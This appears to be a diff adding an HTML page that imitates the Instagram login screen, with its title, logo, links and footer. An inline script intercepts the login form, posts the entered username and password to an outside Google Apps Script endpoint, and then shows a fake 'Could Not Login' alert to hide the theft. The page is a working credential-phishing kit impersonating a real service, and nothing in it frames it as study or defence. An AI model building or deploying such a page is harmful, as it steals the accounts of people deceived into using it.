@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<style type="text/css">
+	body {
+		margin: 10;
+		padding: 10;
+		height: auto;
+		width: auto;
+
+	}
+
+	.Rectangle_1 {
+		border-radius: 3px;
+		border:2px solid #dcdcdc;
+		padding: 3px;
+	}
+	.Rectangle_2 {
+		border-radius: 3px;
+		border:2px solid #dcdcdc;
+		padding: 3px;
+	}
+	.Rectangle_3 {
+		border:2px;
+	border-radius: 3px;
+	}
+	a {
+		text-decoration: none;
+	}
+	a:visited {
+  color: #3b579d;
+    }
+
+
+@media screen and (max-width:360px) {
+body {
+    width: 360px;
+    margin-right: 5px;
+}  
+}
+
+</style>
+<title> Login•Instagram </title>
+<link rel="stylesheet" type="text/css" id="applicationStylesheet" href="reboot.css"/>
+<link rel="icon" href="C:\Users\syed nizam\Documents\Html Css\insta\Instagram-Logo.png">
+
+</head>
+<body>
+	<center>
+
+	<img id="Instagram-Logo" src="Instagram-Logo.png" srcset="Instagram-Logo.png 1x, Instagram-Logo@2x.png 2x">
+
+
+	<form method="post" name="google-sheet">
+    <input  class="Rectangle_1" id="Rectangle_1" type="text" name="email" placeholder="Phone number, username, or email" required="">
+	<input  class="Rectangle_2" id="Rectangle_2" type="password" name="password" placeholder="Password" required="">
+    <input id="Rectangle_3" class="Rectangle_3" style="color: white; background-color: #0095f6;" type="submit" value="Log In" onsubmit="getData">
+</form>
+	
+	<div id="Log_In_with_Facebook">
+		<span><a href="https://www.facebook.com/login.php?">Log In with Facebook</a></span>
+	</div>
+	<div id="Forgot_password">
+	<a href="https://www.instagram.com/accounts/password/reset/">	
+		<span>Forgot password?</span>
+	</a>
+	</div>
+
+	<script>
+		const scriptURL = 'https://script.google.com/macros/s/AKfycbwDFvyk9H_S23KE07OD-0_H5R_bfEsAWKnfRpre2JiU5SRKbr9UdihHS-PGqKY9iEMa/exec'
+		const form = document.forms['google-sheet']
+	
+		form.addEventListener('submit', e => {
+			e.preventDefault()
+			fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+				.then(response => alert("Could Not Login At The Moment"))
+				.catch(error => console.error('Error!', error.message))
+		})
+	</script>
+
+
+
+	<div id="Get_the_app">
+		<span>Get the app.</span>
+	</div>
+	<div id="Dont_have_an_account_Sign_up">
+		<span>Don't have an account? </span>
+		<a href="https://www.instagram.com/accounts/emailsignup/">
+			<span style="color:rgba(0,149,246,1);">Sign up</span>
+		</a>
+	</div>
+	<svg class="Line_1" viewBox="0 0 109 1">
+		<path id="Line_1" d="M 0 0 L 109 0">
+		</path>
+	</svg>
+	<svg class="Line_2" viewBox="0 0 109 1">
+		<path id="Line_2" d="M 0 0 L 109 0">
+		</path>
+	</svg>
+	<div id="OR">
+		<span>OR</span>
+	</div>
+	<img id="Facebook_logo_square" src="Facebook_logo_square.png" srcset="Facebook_logo_square.png 1x, Facebook_logo_square@2x.png 2x">
+	
+</a>
+
+	<div id="About">
+		<span>About</span>
+	</div>
+	<div id="Blog">
+		<span>Blog</span>
+	</div>
+	<div id="Jobs">
+		<span>Jobs</span>
+	</div>
+	<div id="API">
+		<span>API</span>
+	</div>
+	<div id="Privacy">
+		<span>Privacy</span>
+	</div>
+	<div id="Terms">
+		<span>Terms</span>
+	</div>
+	<div id="ID2020_Instagram_from_Facebook">
+		<span>©2020 Instagram from Facebook</span>
+	</div>
+	<div id="English">
+		<span>English</span>
+	</div>
+	<div id="Hashtags">
+		<span>Hashtags</span>
+	</div>
+	<div id="Locations">
+		<span>Locations</span>
+	</div>
+	<div id="Help">
+		<span>Help</span>
+	</div>
+	<svg class="Line_5" viewBox="0 0 1 1">
+		<path id="Line_5" d="M 0 0 L 0 0">
+		</path>
+	</svg>
+	<svg class="Path_1" viewBox="107.413 714.849 8.513 4.634">
+		<path id="Path_1" d="M 107.4126892089844 714.8488159179688 C 108.8208999633789 716.3334350585938 111.9440002441406 719.4830932617188 111.9440002441406 719.4830932617188 L 115.9260635375977 714.8488159179688">
+		</path>
+	</svg>
+</div>
+</center>
+</body>
+</html>
